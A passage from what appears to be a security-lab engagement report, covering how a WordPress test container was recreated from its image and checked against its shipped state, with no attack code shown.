  image non-reproducible at the core-version level. This is the second corpus
  lab where the shipped and served core versions differ.

---

## Restore

Recreated from the image, not by undoing edits.

```
$ docker rm -f master_container && docker run -d --name master_container master:latest
```

Verified **positively**, not by absence of errors:

| Check | Before | After restore |
|---|---|---|
| `GET /` | `200`, 79,557 bytes | `200`, **79,557 bytes** (identical) |
| WordPress users enumerated | 3 (`mario` + 2 created by this engagement) | **1** (`mario`) — back to the shipped value |
| `id` inside the container | `uid=0(root) gid=0(root) groups=0(root)` | same |

`wp-content/uploads/2026/09` exists after the recreate. It was **not** created
by this engagement and was not deleted: it has **0 entries in the shipped
artefact**, contains **0 files**, and its mtime is *after* the container was
recreated, so it is WordPress creating it at runtime. A file another principal
created is not mine to delete.

**Reclaim:** the `master:latest` image and the extracted
`labs/115/master.tar` are re-obtainable from the verified archive
`dist/master.zip` (260.1 MB), which was kept. No global prune was run; no
`auto_deploy.sh` was executed; no container other than this lab's was touched.
